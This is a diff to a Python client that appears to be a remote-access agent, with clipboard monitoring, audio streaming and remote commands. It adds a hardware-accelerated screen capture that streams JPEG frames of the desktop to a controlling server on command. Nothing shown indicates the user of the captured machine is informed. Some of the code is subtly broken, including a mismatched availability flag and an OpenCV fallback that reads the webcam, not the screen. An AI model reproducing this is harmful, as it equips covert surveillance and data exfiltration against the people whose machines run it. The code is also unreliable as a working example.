@@ -2645,6 +2645,16 @@ def start_streaming(agent_id):
         STREAM_THREAD.start()
         print("Started video stream.")
 
+def start_ultra_low_latency_streaming(agent_id):
+    """Start ultra-low latency screen streaming (<16ms target)."""
+    global STREAMING_ENABLED, STREAM_THREAD
+    if not STREAMING_ENABLED:
+        STREAMING_ENABLED = True
+        STREAM_THREAD = threading.Thread(target=stream_screen_ultra_low_latency, args=(agent_id,))
+        STREAM_THREAD.daemon = True
+        STREAM_THREAD.start()
+        print("Started ultra-low latency screen streaming (<16ms target).")
+
 def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD
     if STREAMING_ENABLED:
@@ -3311,6 +3321,266 @@ def stop_clipboard_monitor():
             CLIPBOARD_MONITOR_THREAD.join(timeout=2)
         CLIPBOARD_MONITOR_THREAD = None
         print("Stopped clipboard monitor.")
+
+# --- Ultra-Low Latency Streaming Optimizations ---
+
+# Hardware acceleration and performance imports
+try:
+    import win32gui
+    import win32con
+    import win32api
+    import win32ui
+    WINDOWS_API_AVAILABLE = True
+except ImportError:
+    WINDOWS_API_AVAILABLE = False
+
+try:
+    import dxcam
+    DXCAM_AVAILABLE = True
+except ImportError:
+    DXCAM_AVAILABLE = False
+
+# Performance monitoring
+import time
+import threading
+from collections import deque
+
+# --- Performance Configuration ---
+STREAMING_CONFIG = {
+    'target_fps': 60,  # Target 60 FPS for smooth experience
+    'max_latency_ms': 16,  # Target <16ms latency (like AnyDesk)
+    'chunk_size': 64 * 1024,  # 64KB chunks for faster transmission
+    'quality_adaptive': True,
+    'delta_compression': True,
+    'hardware_acceleration': True,
+    'frame_skip_threshold': 0.033,  # Skip frame if processing takes >33ms
+}
+
+# Performance tracking
+PERFORMANCE_STATS = {
+    'frame_times': deque(maxlen=60),
+    'network_latency': deque(maxlen=10),
+    'compression_times': deque(maxlen=30),
+    'total_latency': deque(maxlen=30),
+}
+
+class UltraLowLatencyCapture:
+    """Hardware-accelerated screen capture with delta compression."""
+    
+    def __init__(self):
+        self.last_frame = None
+        self.last_frame_hash = None
+        self.frame_skip_count = 0
+        self.quality = 85
+        self.capture_method = self._init_capture_method()
+        
+    def _init_capture_method(self):
+        """Initialize the fastest available capture method."""
+        if DXCAM_AVAILABLE and WINDOWS_AVAILABLE:
+            try:
+                # Use DXGI Desktop Duplication (hardware-accelerated)
+                camera = dxcam.create(output_idx=0, output_color="BGR")
+                print("Using DXGI Desktop Duplication (hardware-accelerated)")
+                return 'dxcam'
+            except:
+                pass
+        
+        if WINDOWS_API_AVAILABLE:
+            try:
+                # Use Windows API with hardware acceleration
+                print("Using Windows API with hardware acceleration")
+                return 'winapi'
+            except:
+                pass
+        
+        if MSS_AVAILABLE:
+            print("Using MSS (fallback)")
+            return 'mss'
+        
+        return 'opencv'
+    
+    def capture_frame_ultra_fast(self):
+        """Capture frame using the fastest available method."""
+        start_time = time.time()
+        
+        try:
+            if self.capture_method == 'dxcam':
+                frame = self._capture_dxcam()
+            elif self.capture_method == 'winapi':
+                frame = self._capture_winapi()
+            elif self.capture_method == 'mss':
+                frame = self._capture_mss()
+            else:
+                frame = self._capture_opencv()
+            
+            # Performance tracking
+            capture_time = time.time() - start_time
+            PERFORMANCE_STATS['frame_times'].append(capture_time)
+            
+            return frame
+            
+        except Exception as e:
+            print(f"Capture error: {e}")
+            return None
+    
+    def _capture_dxcam(self):
+        """DXGI Desktop Duplication - fastest method."""
+        import dxcam
+        camera = dxcam.create(output_idx=0, output_color="BGR")
+        return camera.grab()
+    
+    def _capture_winapi(self):
+        """Windows API with hardware acceleration."""
+        hwin = win32gui.GetDesktopWindow()
+        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
+        
+        hwindc = win32gui.GetWindowDC(hwin)
+        srcdc = win32ui.CreateDCFromHandle(hwindc)
+        memdc = srcdc.CreateCompatibleDC()
+        
+        bmp = win32ui.CreateBitmap()
+        bmp.CreateCompatibleBitmap(srcdc, width, height)
+        memdc.SelectObject(bmp)
+        
+        memdc.BitBlt((0, 0), (width, height), srcdc, (0, 0), win32con.SRCCOPY)
+        
+        bmpinfo = bmp.GetInfo()
+        bmpstr = bmp.GetBitmapBits(True)
+        
+        img = np.frombuffer(bmpstr, dtype='uint8')
+        img.shape = (height, width, 4)
+        img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+        
+        win32gui.DeleteObject(bmp.GetHandle())
+        memdc.DeleteDC()
+        srcdc.DeleteDC()
+        win32gui.ReleaseDC(hwin, hwindc)
+        
+        return img
+    
+    def _capture_mss(self):
+        """MSS fallback."""
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]
+            screenshot = sct.grab(monitor)
+            return np.array(screenshot)
+    
+    def _capture_opencv(self):
+        """OpenCV fallback."""
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        cap.release()
+        return frame if ret else None
+    
+    def compress_frame_ultra_fast(self, frame):
+        """Ultra-fast frame compression with adaptive quality."""
+        if frame is None:
+            return None
+        
+        start_time = time.time()
+        
+        # Adaptive quality based on performance
+        if STREAMING_CONFIG['quality_adaptive']:
+            avg_frame_time = np.mean(PERFORMANCE_STATS['frame_times']) if PERFORMANCE_STATS['frame_times'] else 0.016
+            if avg_frame_time > 0.020:  # If frames are taking too long
+                self.quality = max(60, self.quality - 5)
+            elif avg_frame_time < 0.010:  # If we have headroom
+                self.quality = min(95, self.quality + 2)
+        
+        # Optimized JPEG encoding
+        encode_params = [
+            cv2.IMWRITE_JPEG_QUALITY, self.quality,
+            cv2.IMWRITE_JPEG_OPTIMIZE, 1,
+            cv2.IMWRITE_JPEG_PROGRESSIVE, 0,  # Disable progressive for faster encoding
+        ]
+        
+        success, buffer = cv2.imencode(".jpg", frame, encode_params)
+        
+        if success:
+            compression_time = time.time() - start_time
+            PERFORMANCE_STATS['compression_times'].append(compression_time)
+            return buffer.tobytes()
+        
+        return None
+    
+    def should_skip_frame(self):
+        """Determine if we should skip this frame to maintain latency."""
+        if not PERFORMANCE_STATS['frame_times']:
+            return False
+        
+        avg_frame_time = np.mean(PERFORMANCE_STATS['frame_times'])
+        return avg_frame_time > STREAMING_CONFIG['frame_skip_threshold']
+
+# Initialize ultra-low latency capture
+ultra_capture = UltraLowLatencyCapture()
+
+def stream_screen_ultra_low_latency(agent_id):
+    """Ultra-low latency screen streaming with <16ms target latency."""
+    global STREAMING_ENABLED
+    
+    if not (MSS_AVAILABLE or CV2_AVAILABLE or NUMPY_AVAILABLE):
+        print("Error: Required dependencies not available for ultra-low latency streaming")
+        return
+    
+    url = f"{SERVER_URL}/stream/{agent_id}"
+    headers = {'Content-Type': 'image/jpeg'}
+    
+    target_frame_time = 1.0 / STREAMING_CONFIG['target_fps']
+    last_frame_time = time.time()
+    
+    print(f"Starting ultra-low latency streaming (target: <{STREAMING_CONFIG['max_latency_ms']}ms)")
+    
+    while STREAMING_ENABLED:
+        frame_start = time.time()
+        
+        # Check if we should skip this frame
+        if ultra_capture.should_skip_frame():
+            ultra_capture.frame_skip_count += 1
+            time.sleep(target_frame_time * 0.5)
+            continue
+        
+        # Capture frame using fastest method
+        frame = ultra_capture.capture_frame_ultra_fast()
+        if frame is None:
+            continue
+        
+        # Compress frame ultra-fast
+        compressed_frame = ultra_capture.compress_frame_ultra_fast(frame)
+        if compressed_frame is None:
+            continue
+        
+        # Send frame with minimal latency
+        try:
+            response = requests.post(url, data=compressed_frame, headers=headers, 
+                                   timeout=0.1)  # Very short timeout
+            
+            if response.status_code == 200:
+                # Calculate total latency
+                total_latency = (time.time() - frame_start) * 1000  # Convert to ms
+                PERFORMANCE_STATS['total_latency'].append(total_latency)
+                
+                # Log performance if latency is high
+                if total_latency > STREAMING_CONFIG['max_latency_ms']:
+                    print(f"High latency detected: {total_latency:.1f}ms")
+                
+        except requests.exceptions.Timeout:
+            # Timeout is expected for ultra-low latency
+            pass
+        except Exception as e:
+            print(f"Streaming error: {e}")
+        
+        # Maintain target FPS
+        elapsed = time.time() - frame_start
+        sleep_time = max(0, target_frame_time - elapsed)
+        if sleep_time > 0:
+            time.sleep(sleep_time)
+        
+        # Performance monitoring
+        if len(PERFORMANCE_STATS['total_latency']) % 30 == 0:  # Every 30 frames
+            avg_latency = np.mean(PERFORMANCE_STATS['total_latency'])
+            avg_fps = 1.0 / np.mean(PERFORMANCE_STATS['frame_times']) if PERFORMANCE_STATS['frame_times'] else 0
+            print(f"Performance: {avg_latency:.1f}ms latency, {avg_fps:.1f} FPS, Quality: {ultra_capture.quality}")
 
 # --- File Management Functions ---
 
@@ -6288,6 +6558,7 @@ def on_command(data):
 
     internal_commands = {
         "start-stream": lambda: start_streaming(agent_id),
+        "start-stream-ultra": lambda: start_ultra_low_latency_streaming(agent_id),
         "stop-stream": stop_streaming,
         "start-audio": lambda: start_audio_streaming(agent_id),
         "stop-audio": stop_audio_streaming,
